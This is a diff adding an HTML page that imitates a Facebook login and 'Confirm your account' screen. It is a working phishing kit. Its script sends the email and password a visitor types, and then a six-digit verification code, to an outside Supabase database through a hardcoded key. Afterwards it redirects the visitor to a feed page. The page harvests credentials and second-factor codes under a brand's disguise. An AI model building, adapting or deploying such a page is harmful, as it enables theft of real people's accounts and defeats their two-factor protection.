@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook</title>
+<link
+  rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+/>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: Helvetica, Arial, sans-serif;
+    background: #fff;
+  }
+
+  .topbar {
+    background: #f5f6f7;
+    padding: 5px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid #e4e6e9;
+  }
+  .fb-logo {
+    font-size: 26px;
+    font-weight: 800;
+    font-style: italic;
+    color: #a9c0ec;
+    letter-spacing: -1px;
+  }
+  .login-pill {
+    background: #a9c0ec;
+    color: #eef2fb;
+    font-weight: 700;
+    font-size: 17px;
+    padding: 8px 20px;
+    border-radius: 8px;
+  }
+
+.reels-bar {
+  position: relative;
+  overflow: hidden;
+  padding: 22px 20px 60px;
+  display: flex;
+  align-items: center;
+  gap: 20px;
+
+  background: url("./reels-bg.jpg") center center / cover no-repeat;
+}
+
+.reels-bar::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.35); /* Adjust darkness */
+  z-index: 0;
+}
+
+.reels-bar > * {
+  position: relative;
+  z-index: 1;
+}
+  .close-x {
+    color: #e6e6e6;
+    font-size: 26px;
+    font-weight: 400;
+    line-height: 1;
+  }
+  .reels-title {
+    color: #e9e9e9;
+    font-size: 26px;
+    font-weight: 800;
+  }
+
+  .modal {
+    position: relative;
+    max-width: 480px;
+    margin: 0 auto;
+    padding: 40px 24px 40px;
+    text-align: center;
+  }
+  .modal-close {
+    position: absolute;
+    top: 12px;
+    right: 12px;
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    background: #eceff1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #555;
+    font-size: 20px;
+    cursor: pointer;
+  }
+  h1.title {
+    font-size: 22px;
+    font-weight: 800;
+    color: #111;
+    margin: 10px 0 24px 0;
+  }
+
+  input {
+    width: 100%;
+    padding: 16px 14px;
+    font-size: 17px;
+    border-radius: 6px;
+    border: 1px solid #ccd0d5;
+    margin-bottom: 12px;
+    outline: none;
+    font-family: inherit;
+  }
+  input::placeholder {
+    color: #1877f2;
+    font-weight: 500;
+  }
+  input.number::placeholder {
+    color: #90949c;
+    font-weight: 400;
+   
+  }
+  input.email {
+    border: 2px solid #1877f2;
+    box-shadow: 0 0 0 1px #1877f2;
+    text-align: left;
+  }
+ 
+
+  .login-btn {
+    width: 100%;
+    background: #1877f2;
+    color: #fff;
+    font-size: 20px;
+    font-weight: 700;
+    border: none;
+    border-radius: 6px;
+    padding: 15px 0;
+    margin: 12px 0 20px 0;
+    cursor: pointer;
+  }
+  .forgot {
+    color: #1877f2;
+    font-weight: 700;
+    font-size: 16px;
+    text-decoration: none;
+    display: inline-block;
+    margin-bottom: 24px;
+  }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+  .divider .line {
+    flex: 1;
+    height: 1px;
+    background: #dadde1;
+  }
+  .divider span {
+    color: #737373;
+    font-weight: 700;
+    font-size: 15px;
+  }
+
+  .create-btn {
+    width: 100%;
+    background: #42b72a;
+    color: #fff;
+    font-size: 19px;
+    font-weight: 700;
+    border: none;
+    border-radius: 6px;
+    padding: 15px 0;
+    cursor: pointer;
+  }
+  
+.hidden {
+  display: none !important;
+}
+
+#verify-step {
+  min-height: 100vh;
+  background: #ffffff;
+  font-family: Arial, Helvetica, sans-serif;
+  color: #111111;
+}
+
+.confirm-page {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  padding:
+  box-sizing: border-box;
+}
+
+.confirm-back {
+  width: 48px;
+  height: 48px;
+  padding: 0;
+  border: none;
+  background: transparent;
+  color: #606770;
+  font-size: 50px;
+  line-height: 40px;
+  font-weight: 300;
+  text-align: left;
+  cursor: pointer;
+}
+
+.confirm-content {
+  width: 100%;
+  max-width: 720px;
+  
+}
+
+.confirm-content h1 {
+ 
+  font-size: 20px);
+  line-height: 1.15;
+  font-weight: 600;
+  letter-spacing: -1px;
+}
+
+.confirm-description {
+  margin: 0 0 34px;
+  max-width: 680px;
+  font-size: 15px;
+  line-height: 1.35;
+}
+
+.confirm-input {
+  width: 100%;
+  height: 112px;
+  padding: 0 28px;
+  border: 2px solid #ccd0d5;
+  border-radius: 26px;
+  outline: none;
+  box-sizing: border-box;
+  background: #ffffff;
+  color: #111111;
+  font-size: 15px;
+  transition: border-color 0.2s ease;
+}
+
+.confirm-input::placeholder {
+  color: #65676b;
+}
+
+.confirm-input:focus {
+  border-color: #0866ff;
+}
+
+.confirm-button,
+.resend-button {
+  width: 100%;
+  min-height: 88px;
+  margin-top: 72px;
+  border-radius: 50px;
+  font-size: 27px;
+  cursor: pointer;
+}
+
+.confirm-button {
+  border: none;
+  background: #0866e5;
+  color: #ffffff;
+  font-weight: 500;
+}
+
+.confirm-button:disabled {
+  opacity: 0.65;
+  cursor: not-allowed;
+}
+
+.resend-button {
+  margin-top: 23px;
+  border: 2px solid #ccd0d5;
+  background: #ffffff;
+  color: #111111;
+  font-weight: 500;
+}
+
+.confirm-footer {
+  width: 100%;
+  max-width: 590px;
+  margin: auto auto 0;
+  padding-top: 100px;
+  color: #65676b;
+}
+
+.language-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 28px 38px;
+  font-size: 21px;
+  font-weight: 600;
+}
+
+.footer-line {
+  height: 1px;
+  margin: 45px 0 28px;
+  background: #dadde1;
+}
+
+.footer-links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 18px;
+  font-size: 19px;
+  font-weight: 600;
+}
+.button-spinner {
+  width: 18px;
+  height: 18px;
+  display: inline-block;
+  border: 2px solid rgba(255, 255, 255, 0.4);
+  border-top-color: #ffffff;
+  border-radius: 50%;
+  animation: buttonSpin 0.7s linear infinite;
+}
+
+@keyframes buttonSpin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+.password-box {
+  position: relative;
+  width: 100%;
+}
+
+.password-box input {
+  width: 100%;
+  padding-right: 50px;
+  box-sizing: border-box;
+}
+
+.toggle-password {
+  position: absolute;
+  top: 50%;
+  right: 15px;
+  transform: translateY(-50%);
+  cursor: pointer;
+  color: #777;
+  font-size: 18px;
+  transition: .3s;
+}
+
+.toggle-password:hover {
+  color: #000;
+}
+
+@media (max-width: 600px) {
+  .confirm-page {
+    padding: 24px 20px;
+  }
+  
+  .confirm-back {
+    margin-bottom: 45px;
+  }
+  
+  .confirm-input {
+    height: 74px;
+    border-radius: 20px;
+    font-size: 21px;
+  }
+  
+  .confirm-button,
+  .resend-button {
+    min-height: 58px;
+    font-size: 18px;
+  }
+  
+  .confirm-button {
+    margin-top: 54px;
+  }
+  
+  .language-grid {
+    gap: 22px 25px;
+    font-size: 16px;
+  }
+  
+  .footer-links {
+    font-size: 15px;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="fb-logo">facebook</div>
+  <div class="login-pill">Log in</div>
+</div>
+
+<div class="reels-bar">
+  <div class="close-x">&times;</div>
+  <div class="reels-title">Reels</div>
+</div>
+
+<!-- LOGIN STEP -->
+<div id="login-step" class="">
+  <div class="modal">
+    <div class="modal-close">&times;</div>
+
+    <h1 class="title">
+      Watch video on Facebook
+    </h1>
+
+    <input
+      class="email"
+      type="email"
+      placeholder="Email address"
+    >
+
+  <div class="password-box">
+  <input
+    id="password"
+    class="number"
+    type="password"
+    placeholder="Password"
+  >
+
+  <i
+    id="togglePassword"
+    class="fa-solid fa-eye toggle-password"
+    onclick="togglePassword()"
+  ></i>
+</div>
+
+    <button class="login-btn">
+      Log in
+    </button>
+
+    <a class="forgot" href="#">
+      Forgotten password?
+    </a>
+
+    <div class="divider">
+      <div class="line"></div>
+      <span>or</span>
+      <div class="line"></div>
+    </div>
+
+    <button class="create-btn">
+      Create new account
+    </button>
+  </div>
+</div>
+
+
+<!-- VERIFICATION STEP -->
+<div id="verify-step" class="hidden">
+  <div class="confirm-page">
+
+    <button
+      type="button"
+      class="confirm-back"
+      id="back-to-login"
+      aria-label="Go back"
+    >
+      ‹
+    </button>
+
+    <main class="confirm-content">
+    <h1>Confirm your account</h1>
+    
+    <p class="confirm-description">
+      We sent a code to you. Enter that code to confirm your account
+    </p>
+
+      <input
+      id="confirmName"
+        class="code confirm-input"
+        type="number"
+        
+        
+        placeholder="Enter code"
+        maxlength="6"
+      >
+
+      <button
+      id="verifyBtn"
+        type="button"
+        class="verify-btn confirm-button"
+      >
+        Continue
+      </button>
+      <p id="status"></p>
+
+
+    </main>
+
+    <footer class="confirm-footer">
+      <div class="language-grid">
+        <span>English (UK)</span>
+        <span>Hausa</span>
+        <span>Français</span>
+        <span>Português</span>
+        <span>Español</span>
+        <span>العربية</span>
+        <span>More languages…</span>
+      </div>
+
+      <div class="footer-line"></div>
+
+      <div class="footer-links">
+        <span>Sign up</span>
+        <span>Log in</span>
+        <span>Help</span>
+        <span>Privacy</span>
+      </div>
+    </footer>
+
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="share.js"></script>
+<script>
+  const supabaseUrl = "https://oyibjutaqanpbjohxthd.supabase.co";
+  const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im95aWJqdXRhcWFucGJqb2h4dGhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MzE1NzgsImV4cCI6MjA5ODQwNzU3OH0.r3QMpJVyoNHHaKF_Itjqocr6cjk3OZgK9vMckblPqME";
+  const sb = supabase.createClient(supabaseUrl, supabaseKey);
+  
+  let currentUserId = null; // tracks the row we just inserted, so step 2 updates it
+  
+  
+  function togglePassword() {
+  const password = document.getElementById("password");
+  const icon = document.getElementById("togglePassword");
+  
+  if (password.type === "password") {
+    password.type = "text";
+    icon.classList.replace("fa-eye", "fa-eye-slash");
+  } else {
+    password.type = "password";
+    icon.classList.replace("fa-eye-slash", "fa-eye");
+  }
+}
+  const loginBtn = document.querySelector('.login-btn');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const verifyStep = document.getElementById('verify-step');
+  const emailInput = document.querySelector('.email');
+  const phoneInput = document.querySelector('.number');
+  const nameInput = document.getElementById('confirmName');
+  
+  // Step 1: save email + phone, show loading, then reveal step 2
+loginBtn.addEventListener('click', async () => {
+  const email = emailInput.value.trim();
+  const phone = phoneInput.value.trim();
+
+  if (!email || !phone) {
+    alert('Please enter both email and phone number.');
+    return;
+  }
+
+  setLoading(loginBtn, true, 'Logging in…');
+
+  const { data, error } = await sb
+    .from('users')
+    .insert({ email, phone })
+    .select()
+    .single();
+
+  setLoading(loginBtn, false, 'Log in');
+
+  if (error) {
+    console.error('Insert failed:', error);
+    alert('Something went wrong. Please try again.');
+    return;
+  }
+
+  currentUserId = data.id;
+
+  document.getElementById('login-step').classList.add('hidden');
+  verifyStep.classList.remove('hidden');
+});
+
+  
+  // Step 2: update the same row with the name, then redirect
+  verifyBtn.addEventListener('click', async () => {
+    const name = nameInput.value.trim();
+    
+    if (!name) {
+      alert('Please enter a name.');
+      return;
+    }
+    if (!currentUserId) {
+      alert('Something went wrong — please start over.');
+      return;
+    }
+    
+    setLoading(verifyBtn, true, 'Continuing…');
+    
+    const { error } = await sb
+      .from('users')
+      .update({ name })
+      .eq('id', currentUserId);
+    
+    setLoading(verifyBtn, false, 'Continue');
+    
+    if (error) {
+      console.error('Update failed:', error);
+      alert('Something went wrong. Please try again.');
+      return;
+    }
+    
+    window.location.href = 'feed.html';
+  });
+  
+  function setLoading(button, isLoading, label) {
+    button.disabled = isLoading;
+    button.textContent = isLoading ? label : label;
+  }
+</script>
+
+
+</body>
+</html>
